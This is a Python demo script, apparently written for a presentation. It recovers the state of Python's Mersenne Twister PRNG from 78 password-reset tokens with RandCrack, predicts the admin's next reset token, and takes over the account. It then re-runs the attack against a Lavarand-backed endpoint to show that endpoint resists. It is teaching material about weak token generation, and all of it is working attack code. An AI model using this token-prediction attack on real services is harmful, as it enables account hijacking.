import requests
from randcrack import RandCrack
import sys

def attempt_attack(base_url, endpoint_prefix, is_secure_test=False):
    rc = RandCrack()
    
    print(f"\n--- INICIANDO ATAQUE CONTRA: {endpoint_prefix} ---")
    print("FASE 1: Recolección de entropía (78 requests x 8 bloques = 624)...")
    
    for i in range(78):
        response = requests.post(f"{base_url}{endpoint_prefix}/hacker")
        token_str = response.json().get("token")
        token_256 = int(token_str)
        
        # RandCrack necesita exactamente 32 bits. 
        # Si nuestra entropía segura genera números más grandes/chicos, RandCrack puede quejarse.
        # Recortamos el token en 8 bloques de 32 bits
        for chunk_index in range(8):
            # Extraemos 32 bits usando una máscara y desplazando
            chunk_32 = (token_256 >> (32 * chunk_index)) & 0xFFFFFFFF
            try:
                rc.submit(chunk_32)
            except ValueError as e:
                if is_secure_test:
                    print(f"[-] RandCrack falló al ingerir el token: {e}")
                    print("[-] La estructura matemática esperada no existe.")
                    return
                else:
                    raise e

        if (i+1) % 10 == 0 or (i+1) == 78:
            print(f"[*] Procesados {i+1}/78 tokens...")

    print("\n[+] Intentando sincronizar PRNG...")
    
    print("\nFASE 2: Predicción del próximo token...")
    try:
        # Reconstruimos un token gigante prediciendo 8 bloques futuros
        predicted_token_256 = 0
        for chunk_index in range(8):
            predicted_chunk_32 = rc.predict_getrandbits(32)
            predicted_token_256 |= (predicted_chunk_32 << (32 * chunk_index))
            
        predicted_token_str = str(predicted_token_256)
        print(f"[*] Según la matemática, el próximo token gigante DEBE ser: \n{predicted_token_str}")
    except Exception as e:
        print(f"[-] Error al intentar predecir: {e}")
        return
    
    print("[*] Disparando reseteo de contraseña real para el usuario 'admin'...")
    requests.post(f"{base_url}{endpoint_prefix}/admin")
    
    print("\nFASE 3: Secuestro de la cuenta...")
    new_admin_password = "pwned_by_lavarand"
    print(f"[*] Enviando payload para cambiar la contraseña a: '{new_admin_password}'")
    
    payload = {
        "username": "admin",
        "token": predicted_token_str,
        "new_password": new_admin_password
    }
    
    change_response = requests.post(f"{base_url}/change_password", json=payload)
    
    if change_response.status_code == 200:
        print("\n[+] ¡ÉXITO! Contraseña del admin cambiada.")
        
        print("[*] Intentando hacer login con la nueva contraseña...")
        login_payload = {"username": "admin", "password": new_admin_password}
        login_response = requests.post(f"{base_url}/login", json=login_payload)
        
        if login_response.status_code == 200:
            print(f"[CRÍTICO] {login_response.json()['message']}")
            print("[CRÍTICO] Has tomado control total del sistema.")
        else:
            print("[-] Falló el login posterior.")
    else:
        print(f"\n[FRACASO] Falló el cambio de contraseña. Código HTTP: {change_response.status_code}")
        print("[FRACASO] El token predicho era incorrecto. El ataque fue mitigado exitosamente.")

def main():
    base_url = "http://127.0.0.1:8000"
    
    # ACTO 1: Demostrar la vulnerabilidad estándar
    attempt_attack(base_url, "/request_reset", is_secure_test=False)
    
    # PAUSA DRAMÁTICA PARA LA PRESENTACIÓN
    print("\n" + "="*60)
    input("[!] Presioná ENTER para habilitar Lavarand y lanzar el mismo ataque contra el endpoint seguro...")
    print("="*60)
    
    # ACTO 2: Demostrar la resiliencia del nuevo sistema
    attempt_attack(base_url, "/secure_request_reset", is_secure_test=True)

if __name__ == "__main__":
    main()